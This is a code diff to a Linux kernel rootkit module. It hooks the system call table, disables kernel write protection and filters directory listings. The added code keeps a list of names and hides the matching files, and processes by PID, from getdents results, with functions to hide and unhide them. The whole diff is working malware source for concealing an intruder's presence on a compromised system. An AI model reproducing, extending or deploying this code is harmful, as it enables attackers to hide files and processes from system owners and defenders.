@@ -14,6 +14,8 @@
 #define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
 #define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));
 
+struct list_head list_files = LIST_HEAD_INIT(list_files);
+
 struct linux_dirent {
     unsigned long   d_ino;
     unsigned long   d_off;
@@ -57,19 +59,33 @@ asmlinkage long sys_write_hook(unsigned int fd, const char __user* buf, size_t c
 asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, long ret) {
 	int buff_offset, deleted_size;
 	struct linux_dirent* currnt;
+	struct list_files_node* node;
+	bool del;
 	//printk(KERN_INFO "ROOTKIT: sysgetdents init\n");
 
 	buff_offset = 0;
 	while (buff_offset < ret){
 		currnt = (struct linux_dirent*)((char*)dirent + buff_offset);
-		if (strstr(currnt->d_name, HIDE_STR) != NULL){
-			printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
+		del = false;
+		if (strstr(currnt->d_name, HIDE_STR) != NULL)
+			del = true;
+
+		list_for_each_entry(node, &list_files, list){
+			if (strcmp(currnt->d_name, node->name) == 0){
+				del = true;
+				break;
+			}
+		}
+
+		if (del){
+			//printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
 			// Copies the rest of the buffer to the position of the current entry
 			deleted_size = currnt->d_reclen;
 			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
 			ret -= deleted_size;
 		} else
 			buff_offset += currnt->d_reclen;
+
 	}
 	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
 	return ret;
@@ -106,4 +122,80 @@ void __exit hooks_exit(void){
 	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
 	if (HOOK_WRITE) syscall_table[__NR_write] = sys_write_orig;
 	DISABLE_WRITE();
+
+	// delete list
+	struct list_files_node* node, *tmp;
+	list_for_each_entry_safe(node, tmp, &list_files, list){
+		list_del(&node->list);
+		kfree(node);
+	}
+}
+
+// HIDE THOSE FKING FILES
+int hide_file(const char* name){
+	struct list_files_node* node = kmalloc(sizeof(struct list_files_node), GFP_KERNEL);
+	if (node == NULL){
+		printk(KERN_INFO "ROOTKIT: ERROR allocating node for hiding file %s\n", name);
+		return -1;
+	}
+
+	node->name = kmalloc(strlen(name)+1, GFP_KERNEL);
+	if (node->name == NULL){
+		printk(KERN_INFO "ROOTKIT: ERROR allocating node name for hiding file %s\n", name);
+		kfree(node);
+		return -1;
+	}
+
+	strcpy(node->name, name);
+	list_add(&node->list, &list_files);
+	printk(KERN_INFO "ROOTKIT: Hidden file %s\n", name);
+	return 0;
+}
+
+int unhide_file(const char* name){
+	struct list_files_node *node, *tmp;
+	list_for_each_entry_safe(node, tmp, &list_files, list){
+		if (strcmp(node->name, name) == 0){
+			list_del(&node->list);
+			kfree(node->name);
+			kfree(node);
+			printk(KERN_INFO "ROOTKIT: Unhidden file %s\n", name);
+			return 0;
+		}
+	}
+	printk(KERN_INFO "ROOTKIT: ERROR trying to unhide not found file %s\n", name);
+	return -1;
+}
+
+// HIDE THOSE FKING PIDS
+int hide_pid(int pid){
+	char pid_s[8]; //PID_MAX_LIMIT can be up to 2^22 = 4194304
+	if (pid > PID_MAX_LIMIT){
+		printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d larger than PID_MAX_LIMIT\n", pid);
+		return -1;
+	}
+	snprintf(pid_s, sizeof(pid_s), "%d", pid);
+	return hide_file(pid_s);
+	/*
+	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
+	node->pid = pid;
+	list_add(&node->list, &list_pids);
+	printk("ROOTKIT: Pid %d hidden\n", pid);*/
+}
+
+int unhide_pid(int pid){
+	char pid_s[8];
+	snprintf(pid_s, sizeof(pid_s), "%d", pid);
+	return unhide_file(pid_s);
+	/*
+	struct list_pids_node* node, *tmp;
+	list_for_each_entry_safe(node, tmp, &list_pids, list){
+		if (node->pid == pid){
+			list_del(&node->list);
+			kfree(node);
+			printk("ROOTKIT: Pid %d unhidden\n", pid);
+			break;
+		}
+	}
+	*/
 }
